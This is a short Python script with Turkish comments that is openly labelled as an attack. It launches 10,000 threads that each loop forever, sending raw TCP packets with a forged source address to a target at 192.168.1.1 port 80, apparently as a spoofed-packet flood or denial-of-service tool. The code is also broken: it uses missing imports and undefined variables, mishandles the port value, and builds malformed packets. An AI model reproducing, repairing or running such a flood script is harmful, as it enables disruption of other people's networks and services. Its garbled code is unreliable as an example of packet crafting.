import socket
import threading

# Hedef IP adresi ve port numarası
target = '192.168.1.1'
port = 80

# Hedefi saldırmak için yaratılan paket sayısı
fake_ip_count = 10000

# IP adresleri ve bağlantı noktaları için sözlük oluşturma
connections = {}

# Hedefi saldırmak için bir IP adresi ve bağlantı noktası oluşturma
def create_connection():
    while True:
        source_ip = '182.21.200.200'
        source_port = random.randint(1000, 65535)

        if source_ip not in connections:
            connections[source_ip] = []

        if { 'ip': target, 'port': port } not in connections[source_ip]:
            connections[source_ip].append({ 'ip': target, 'port': port })

        ip_address = socket.inet_aton(source_ip)
        port = socket.htons(source_port)
        target_ip = socket.inet_aton(target)
        target_port = socket.htons(port)

        try:
            packet = socket.inet_aton(source_ip) + socket.inet_aton(target) + struct.pack('!HHHH', sport, dport, seq, ack)
            send_packet = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            send_packet.sendto(packet, (target, port))
            connections[source_ip].append({ 'ip': target, 'port': port })
            send_packet.close()
        except:
            pass

# Saldırı başlatma
for _ in range(fake_ip_count):
    thread = threading.Thread(target=create_connection)
    thread.start()
